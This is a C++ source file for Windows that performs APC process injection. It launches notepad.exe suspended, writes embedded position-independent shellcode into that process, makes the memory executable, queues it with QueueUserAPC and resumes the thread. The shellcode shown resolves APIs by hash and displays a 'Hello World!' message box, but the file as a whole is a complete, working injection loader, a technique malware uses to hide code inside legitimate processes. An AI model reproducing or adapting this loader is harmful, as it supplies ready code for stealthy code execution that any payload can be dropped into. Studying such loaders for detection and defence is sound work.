#include <iostream>
#include <string>
#include <windows.h>
#include <tlhelp32.h>

#if defined(_M_X64) // _M_AMD64
unsigned char hexData[388] = {
    0xE9, 0x0B, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
    0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x41, 0x57, 0x65,
    0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xF9, 0x48, 0x8B, 0x50, 0x18, 0x4C,
    0x8B, 0x72, 0x20, 0x4D, 0x8B, 0xC6, 0x4D, 0x8B, 0x48, 0x20, 0x4D, 0x8B, 0x00, 0x4D, 0x85, 0xC9,
    0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B, 0x8C, 0x08, 0x88, 0x00,
    0x00, 0x00, 0x85, 0xC9, 0x74, 0x79, 0x4D, 0x8D, 0x14, 0x09, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03,
    0xD1, 0x33, 0xFF, 0xEB, 0x16, 0xC1, 0xCF, 0x0D, 0x41, 0x0F, 0xBE, 0xCB, 0x41, 0x80, 0xFB, 0x61,
    0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF8, 0x48, 0xFF, 0xC2, 0x44, 0x8A, 0x1A, 0x45, 0x84,
    0xDB, 0x75, 0xE2, 0x41, 0x8B, 0x52, 0x20, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD1, 0x45, 0x39, 0x5A,
    0x18, 0x76, 0x3C, 0x8B, 0x1A, 0x49, 0x03, 0xD9, 0x33, 0xF6, 0xEB, 0x16, 0xC1, 0xCE, 0x0D, 0x40,
    0x0F, 0xBE, 0xCD, 0x40, 0x80, 0xFD, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF0, 0x48,
    0xFF, 0xC3, 0x40, 0x8A, 0x2B, 0x40, 0x84, 0xED, 0x75, 0xE2, 0x8D, 0x04, 0x37, 0x44, 0x3B, 0xF8,
    0x74, 0x31, 0x41, 0xFF, 0xC3, 0x48, 0x83, 0xC2, 0x04, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xC4, 0x4D,
    0x3B, 0xC6, 0x0F, 0x85, 0x5E, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x48,
    0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F,
    0x41, 0x5E, 0xC3, 0x41, 0x8B, 0x4A, 0x24, 0x49, 0x03, 0xC9, 0x46, 0x0F, 0xB7, 0x04, 0x59, 0x41,
    0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC9, 0x42, 0x8B, 0x04, 0x81, 0x49, 0x03, 0xC1, 0xEB, 0xCB, 0xCC,
    0x40, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x40, 0x33, 0xC0, 0xC7, 0x45, 0xE0, 0x75, 0x73,
    0x65, 0x72, 0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0x88, 0x45, 0xEA, 0x88, 0x45, 0x14, 0x88, 0x45, 0xFC,
    0xC7, 0x45, 0xE4, 0x33, 0x32, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xE8, 0x6C, 0x6C, 0xC7, 0x45, 0x10,
    0x54, 0x65, 0x73, 0x74, 0xC7, 0x45, 0xF0, 0x48, 0x65, 0x6C, 0x6C, 0xC7, 0x45, 0xF4, 0x6F, 0x20,
    0x57, 0x6F, 0xC7, 0x45, 0xF8, 0x72, 0x6C, 0x64, 0x21, 0xE8, 0xAA, 0xFE, 0xFF, 0xFF, 0x48, 0x8D,
    0x4D, 0xE0, 0xFF, 0xD0, 0xB9, 0x9E, 0x78, 0x78, 0xCD, 0xE8, 0x9A, 0xFE, 0xFF, 0xFF, 0x45, 0x33,
    0xC9, 0x4C, 0x8D, 0x45, 0x10, 0x48, 0x8D, 0x55, 0xF0, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x83, 0xC4,
    0x40, 0x5D, 0xC3, 0xCC 
};
#else
unsigned char hexData[308] = {
    0xE9, 0xC2, 0x00, 0x00, 0x00, 0x53, 0x56, 0x8B, 0xF1, 0x33, 0xD2, 0xEB, 0x12, 0x0F, 0xBE, 0xCB,
    0xC1, 0xCA, 0x0D, 0x80, 0xFB, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xD0, 0x46, 0x8A,
    0x1E, 0x84, 0xDB, 0x75, 0xE8, 0x5E, 0x8B, 0xC2, 0x5B, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14,
    0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x0C, 0x89, 0x4D, 0xF4, 0x8B,
    0x40, 0x14, 0x8B, 0xF8, 0x89, 0x45, 0xEC, 0x8B, 0x77, 0x10, 0x8B, 0x3F, 0x85, 0xF6, 0x74, 0x4F,
    0x8B, 0x46, 0x3C, 0x8B, 0x5C, 0x30, 0x78, 0x85, 0xDB, 0x74, 0x44, 0x8B, 0x4C, 0x33, 0x0C, 0x03,
    0xCE, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x8B, 0x4C, 0x33, 0x20, 0x89, 0x45, 0xF8, 0x03, 0xCE, 0x33,
    0xC0, 0x89, 0x4D, 0xF0, 0x89, 0x45, 0xFC, 0x39, 0x44, 0x33, 0x18, 0x76, 0x22, 0x8B, 0x0C, 0x81,
    0x03, 0xCE, 0xE8, 0x7E, 0xFF, 0xFF, 0xFF, 0x03, 0x45, 0xF8, 0x39, 0x45, 0xF4, 0x74, 0x1C, 0x8B,
    0x45, 0xFC, 0x8B, 0x4D, 0xF0, 0x40, 0x89, 0x45, 0xFC, 0x3B, 0x44, 0x33, 0x18, 0x72, 0xDE, 0x3B,
    0x7D, 0xEC, 0x75, 0xA3, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x8B, 0x4D, 0xFC, 0x8B, 0x44,
    0x33, 0x24, 0x8D, 0x04, 0x48, 0x0F, 0xB7, 0x0C, 0x30, 0x8B, 0x44, 0x33, 0x1C, 0x8D, 0x04, 0x88,
    0x8B, 0x04, 0x30, 0x03, 0xC6, 0xEB, 0xDF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x24, 0x53, 0x33, 0xDB,
    0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65, 0x72, 0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0xC7, 0x45, 0xF0, 0x33,
    0x32, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x54,
    0x65, 0x73, 0x74, 0x88, 0x5D, 0xFC, 0xC7, 0x45, 0xDC, 0x48, 0x65, 0x6C, 0x6C, 0xC7, 0x45, 0xE0,
    0x6F, 0x20, 0x57, 0x6F, 0xC7, 0x45, 0xE4, 0x72, 0x6C, 0x64, 0x21, 0x88, 0x5D, 0xE8, 0xE8, 0x17,
    0xFF, 0xFF, 0xFF, 0x8D, 0x4D, 0xEC, 0x51, 0xFF, 0xD0, 0xB9, 0x9E, 0x78, 0x78, 0xCD, 0xE8, 0x07,
    0xFF, 0xFF, 0xFF, 0x53, 0x8D, 0x4D, 0xF8, 0x51, 0x8D, 0x4D, 0xDC, 0x51, 0x53, 0xFF, 0xD0, 0x5B,
    0xC9, 0xC2, 0x04, 0x00 
};
#endif

int ApcInject(char* shellcode, int length){
#if defined(_M_X64) // _M_AMD64
	WCHAR exePath[] = L"C:\\Windows\\System32\\notepad.exe";
#else
	WCHAR exePath[] = L"C:\\Windows\\SysWow64\\notepad.exe";
#endif
    PROCESS_INFORMATION procInfo = {0};
	STARTUPINFOW startInfo = {0};
	LPVOID baseAddress = nullptr;
	DWORD oldProtect = 0;
	PAPCFUNC pfnApc;
    DWORD ret = 0;
    
    // Creating target process in suspended mode
    std::cout << "[+] creating process in suspended mode" << std::endl;
    std::wcout << "[+] creating process path: " << exePath << std::endl;
	if (!CreateProcessW(NULL, exePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &procInfo)) {
        std::cout << "[-] Error creating process in suspended mode, error code: " << GetLastError() << std::endl;
		goto cleanup;
	}

    // Allocating memory in remote process with protection PAGE_READWRITE
    std::cout << "[+] allocate memory in target process" << std::endl;
	baseAddress = VirtualAllocEx(procInfo.hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (baseAddress == nullptr){
        std::cout << "[-] allocate memory failed, error code: " << GetLastError() << std::endl;
		goto cleanup;
    }
    std::cout << "[+] remote memory allocated at address: " << baseAddress << std::endl;

    // Write shellcode to remote process memory
	if (!WriteProcessMemory(procInfo.hProcess, baseAddress, shellcode, length, NULL)) {
        std::cout << "[-] error writing payload into the remote rocess, error code: " << GetLastError() << std::endl;
		goto cleanup;
	}

    // Changing memory protection of allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ
    std::cout << "[+] changing memory protection RW -> RX" << std::endl;
	if (!VirtualProtectEx(procInfo.hProcess, baseAddress, length, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "[-] error changing memory protection, error code: " << GetLastError() << std::endl;
		goto cleanup;
	}

    // Setting up the routine (APC routine)
    pfnApc = (PAPCFUNC)baseAddress;
	// Put our payload/APC function in queue 
    std::cout << "[+] puting our payload in queue" << std::endl;
	if (!QueueUserAPC(pfnApc, procInfo.hThread, 0)){
        std::cout << "[-] error QueueUserAPC, error code: " << GetLastError() << std::endl;
		goto cleanup;
    }

    // Resume the thread
    std::cout << "[+] resuming Thread" << std::endl;
	ResumeThread(procInfo.hThread);
	//Sleep(1000 * 2);

cleanup:

    return 0;
}

int main(int argc, char** argv){
   
   ApcInject((char*)hexData, sizeof(hexData));

    return 0;
}